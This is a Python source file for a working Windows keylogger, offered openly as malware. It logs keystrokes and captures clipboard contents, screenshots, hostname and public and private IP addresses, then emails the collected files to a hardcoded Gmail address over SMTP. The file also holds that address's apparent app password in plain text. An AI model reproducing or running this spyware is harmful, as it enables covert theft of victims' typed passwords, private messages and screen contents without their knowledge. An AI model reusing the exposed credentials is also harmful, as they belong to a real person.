# libraries for keylogger..
# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# SMTP mail
from email import encoders
import smtplib

# default libraries for collecting information of computer
import socket
import platform
import win32clipboard
import getpass
from requests import get

# for keystroke
from pynput.keyboard import Key, Listener

# system info to track the time module and OS module
import time
import os

# microphone
from scipy.io.wavfile import write
import sounddevice as sd

# Screenshot at a time (1) and pillow image for import image
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# txt file whaere all keys are saved
keys_information = "Key_log.txt"
#for clipboard info
clipboard_information = "clipboard.txt"

#for screenshot
screenshot_information = "screenshot.png"

# email address to send the file
email_address = "riyamodi1297@gmail.com"
password = "yjnugetujlcjxtga"
toaddr = "riyamodi1297@gmail.com"

#varible for system info
system_information = "systeminfo.txt"
username = getpass.getuser()
file_path = r"C:\Users\hp\Documents\KeyLogger" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

with open(file_path + extend + keys_information, 'w') as f:
    f.write('')
with open(file_path + extend + system_information, 'w') as f:
    f.write('')
with open(file_path + extend + clipboard_information, 'w') as f:
    f.write('')
# email function
def send_email(filename, attachment_arr, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    for fileName, attachment in zip(filename, attachment_arr):
        filename = fileName
        attachment = open(attachment, 'rb')

        p = MIMEBase('application', 'octet-stream')

        p.set_payload((attachment).read())

        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()
# computer information function
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

#  clipboard function
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

count = 0
keys = []
def on_press(key):
    global keys, count

    # print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

delay = 60 * 1
close_time = time.time() + delay

while True:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if time.time() > close_time:
        
        screenshot()
        copy_clipboard()
        computer_information()

        files = [system_information, clipboard_information, keys_information, screenshot_information]
        atc_arr = [file_path + extend + system_information, file_path + extend + clipboard_information, file_path + extend + keys_information, file_path + extend + screenshot_information]
        send_email(files, atc_arr, toaddr)
        break

    count = 0
    keys = []
    print("\nstart")

    screenshot()
    copy_clipboard()
    computer_information()

    files = [system_information, clipboard_information, keys_information, screenshot_information]
    atc_arr = [file_path + extend + system_information, file_path + extend + clipboard_information, file_path + extend + keys_information, file_path + extend + screenshot_information]
    send_email(files, atc_arr, toaddr)
    time.sleep(5)
    print("\nmail send")

